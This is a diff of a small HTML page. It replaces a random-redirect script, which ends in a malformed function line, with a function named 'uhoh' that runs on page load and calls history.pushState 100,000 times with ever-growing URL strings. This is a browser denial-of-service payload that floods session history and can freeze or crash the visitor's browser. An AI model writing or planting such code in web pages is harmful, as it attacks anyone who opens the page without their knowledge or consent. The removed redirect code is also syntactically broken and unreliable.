@@ -1,32 +1,14 @@
 <!DOCTYPE html> <html> <body>
- <script> 
-  function gg(url) {
-  const randomValue = Math.random();
-  const consoleMessage = `Random value: ${randomValue}`;
-
-  const consoleElement = document.createElement('p');
-  consoleElement.innerText = consoleMessage;
-  document.body.appendChild(consoleElement);
-
-  if (randomValue < 0.10) {
-    const redirectMessage = `Redirecting to ${url}`;
-
-    const redirectElement = document.createElement('p');
-    redirectElement.innerText = redirectMessage;
-    document.body.appendChild(redirectElement);
-
-    window.location.href = url;
-  } else {
-    const redirectMessage = `Redirecting to ./3.html`;
-
-    const redirectElement = document.createElement('p');
-    redirectElement.innerText = redirectMessage;
-    document.body.appendChild(redirectElement);
-
-    window.location.href = './3.html';
+ <script>
+  function uhoh() {
+    var total = "";
+    for (var i = 0; i < 100000; i++ ) {
+        total = total + i.toString();
+        history.pushState(0,0, total );
+    }
   }
-}         
-  function gg(/./) 
+  
+  uhoh()
 </script>
 </body> 
 </html>
